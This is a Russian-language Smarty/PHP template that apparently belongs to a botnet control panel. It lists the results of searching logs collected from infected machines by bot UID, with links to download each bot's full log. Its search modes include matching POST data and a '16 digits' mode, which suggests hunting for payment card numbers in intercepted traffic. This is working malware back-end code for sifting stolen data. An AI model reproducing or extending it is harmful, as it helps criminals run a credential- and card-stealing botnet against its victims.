<div id="div_sub_{$rand_name}"></div>
<script language="javascript" type="application/javascript">
var id_{$rand_name} = document.getElementById('div_sub_{$rand_name}').parentNode.id.replace('_content', '');
document.getElementById(id_{$rand_name} + '_title').innerHTML = 'Результаты #{$list->id}';
</script>

<table cellspacing="1" cellpadding="0" style="width: 100%; border: 1px solid #cccccc;">
<tr class="bgp1">
    <th style="text-align: left; width: 250px;">Текст</th>
    <th style="text-align: left;">{$list->searched}</th>
</tr>
<tr class="bgp2">
    <th style="text-align: left; width: 250px;">Префикс</th>
    <th style="text-align: left;">{if $list->prefix eq '*'}Любой{else}{$list->prefix}{/if}</th>
</tr>
<tr class="bgp1">
    <th style="text-align: left; width: 250px;">Дата</th>
    <th style="text-align: left;">{if $list->date eq '*'}Любоя{else}{$list->date}{/if}</th>
</tr>
<tr class="bgp2">
    <th style="text-align: left; width: 250px;">Тип поиска</th>
    <th style="text-align: left;">{if $list->sparam eq 1}Обычный{elseif $list->sparam eq 2}Обычный в ссылке{elseif $list->sparam eq 3}Обычный в пост данных{elseif $list->sparam eq 4}Регесп ко всей строке{elseif $list->sparam eq 5}16 цифр{/if}</th>
</tr>
<tr class="bgp1">
    <th style="text-align: left; width: 250px;">Статус</th>
    <th style="text-align: left;">{if $list->status eq 0}Ожидание{elseif $list->status eq 1}Запуск{elseif $list->status eq 2}{math equation="x / y * 100" x=$list->finished y=$list->queued format="%.2f"}%{elseif $list->status eq 3}Завершено{elseif $list->status eq 4}Ошибка{/if}</th>
</tr>
</table>
<h2 align="center">Результаты</h2>
<div align="center">{$pages}</div>
<br />
<table cellspacing="1" cellpadding="0" style="width: 100%; border: 1px solid #cccccc;font-size:10px; text-align: center">
<tr class="bgp3">
<td style="width: 60%;">UID (открыть инфу бота)</td>
<td style="width: 25%;">Дата (скачать весь лог)</td>
<td style="width: 25%;">Результат</td>
</tr>
{foreach from=$result item=sitem name=sresult}
{if $smarty.foreach.sresult.iteration is not even}{assign var=bg value=1}{else}{assign var=bg value=2}{/if}
<tr class="bgp{$bg}" onmousemove="this.className = 'bgp4'" onmouseout="this.className = 'bgp{$bg}'" style="border: 1px solid #FFFFFF; cursor:pointer;">
<th>{$sitem->prefix}{$sitem->uid}</th>
{php}
global $smarty;
@preg_match_all('~/([0-9]+)/(.*)~is', $smarty->tpl_vars[sitem]->value[file], $matches, PREG_PATTERN_ORDER);
$smarty->tpl_vars['sitem']->value[file] = $matches[0][0];
{/php}
<th><a href="/files/download-5.html?str={$sitem->prefix}&amp;file={$sitem->prefix}&amp;name={$sitem->file}&type=1" target="_blank">{$sitem->file|@basename}</a></th>
<th><a href="/files/download-6.html?file={$sitem->result_file}" target="_blank">посмотреть</a></th>
</tr>
{/foreach}
</table>
<br />
<div align="center">{$pages}</div>
<br />